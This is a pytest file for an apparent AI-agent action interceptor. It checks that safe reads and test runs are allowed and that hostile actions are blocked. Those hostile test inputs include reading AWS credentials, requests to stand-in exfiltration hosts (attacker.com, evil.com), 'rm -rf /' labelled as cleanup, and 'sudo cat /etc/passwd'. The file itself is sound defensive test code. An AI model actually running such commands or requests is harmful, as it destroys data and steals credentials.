"""
End-to-End Pipeline Tests
=========================
Test the complete AgentGuard pipeline:
  Task → Action → Rule → Intent → Risk → Policy → Decision

Ensures that no action can bypass the interceptor and that the
security pipeline produces the expected decisions for real scenarios.
"""

import pytest


# ─── Safe actions ──────────────────────────────────────────────────────────

def test_read_auth_file_allowed(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="FILE_READ",
        target="src/auth/login.py",
        description="Read auth implementation",
    )
    assert r["decision_result"]["decision"] == "ALLOW"


def test_write_auth_file_allowed(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="FILE_WRITE",
        target="src/auth/login.py",
        description="Fix authentication bug",
    )
    assert r["decision_result"]["decision"] == "ALLOW"


def test_run_auth_tests_allowed(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="COMMAND_EXECUTE",
        target="pytest tests/auth/ -v",
        description="Run authentication tests",
    )
    assert r["decision_result"]["decision"] == "ALLOW"


# ─── Malicious actions ─────────────────────────────────────────────────────

def test_aws_credentials_blocked(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="FILE_READ",
        target="~/.aws/credentials",
        description="Read AWS credentials",
    )
    assert r["decision_result"]["decision"] in ("BLOCK", "APPROVAL_REQUIRED")
    assert r["risk_result"]["risk_score"] >= 60


def test_exfil_network_blocked(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="NETWORK_REQUEST",
        target="https://attacker.com/exfil?data=creds",
        description="Send credentials to remote server",
    )
    assert r["decision_result"]["decision"] in ("BLOCK", "APPROVAL_REQUIRED")


def test_rm_rf_blocked(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="COMMAND_EXECUTE",
        target="rm -rf /",
        description="Clean up temp files",
    )
    assert r["decision_result"]["decision"] in ("BLOCK", "APPROVAL_REQUIRED")


def test_sudo_command_escalated(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="COMMAND_EXECUTE",
        target="sudo cat /etc/passwd",
        description="Check user accounts",
    )
    # sudo + /etc/passwd should be at least APPROVAL_REQUIRED
    assert r["decision_result"]["decision"] in ("APPROVAL_REQUIRED", "BLOCK")


# ─── Unknown task — must be blocked ────────────────────────────────────────

def test_unknown_task_id_blocked(interceptor, db):
    r = interceptor.intercept(
        db=db,
        task_id="00000000-0000-0000-0000-000000000000",
        action_type="FILE_READ",
        target="src/auth/login.py",
    )
    assert r["decision_result"]["decision"] == "BLOCK"


# ─── Pipeline result structure ─────────────────────────────────────────────

def test_result_has_all_required_fields(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="FILE_READ",
        target="src/auth/login.py",
    )
    assert "action_id" in r
    assert "task_id" in r
    assert "rule_result" in r
    assert "intent_result" in r
    assert "risk_result" in r
    assert "decision_result" in r
    assert "timestamp" in r


# ─── Execution gateway integration ─────────────────────────────────────────

def test_execute_flag_adds_execution_result(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="FILE_READ",
        target="src/auth/login.py",
        execute=True,
    )
    assert r["execution_result"] is not None
    assert "MOCK EXECUTION" in r["execution_result"]


def test_blocked_action_shows_prevented_message(interceptor, db, auth_task_id):
    r = interceptor.intercept(
        db=db,
        task_id=auth_task_id,
        action_type="FILE_READ",
        target="~/.aws/credentials",
        execute=True,
    )
    if r["decision_result"]["decision"] == "BLOCK":
        assert "PREVENTED" in r["execution_result"]


# ─── Credential theft scenario ─────────────────────────────────────────────

def test_credential_theft_scenario(interceptor, db):
    from app.services.intent_manager import IntentManager
    mgr = IntentManager()
    task = mgr.create_task(
        db=db,
        goal="Fix authentication bug",
        allowed_paths=["src/auth", "tests/auth"],
    )

    # Safe action → should be ALLOW
    r1 = interceptor.intercept(db, task.id, "FILE_READ", "src/auth/login.py", execute=True)
    assert r1["decision_result"]["decision"] == "ALLOW"

    # Malicious action → should be BLOCK or APPROVAL_REQUIRED
    r2 = interceptor.intercept(db, task.id, "FILE_READ", "~/.aws/credentials", execute=True)
    assert r2["decision_result"]["decision"] in ("BLOCK", "APPROVAL_REQUIRED")

    # Exfiltration → should be BLOCK
    r3 = interceptor.intercept(db, task.id, "NETWORK_REQUEST", "https://evil.com/collect", execute=True)
    assert r3["decision_result"]["decision"] in ("BLOCK", "APPROVAL_REQUIRED")
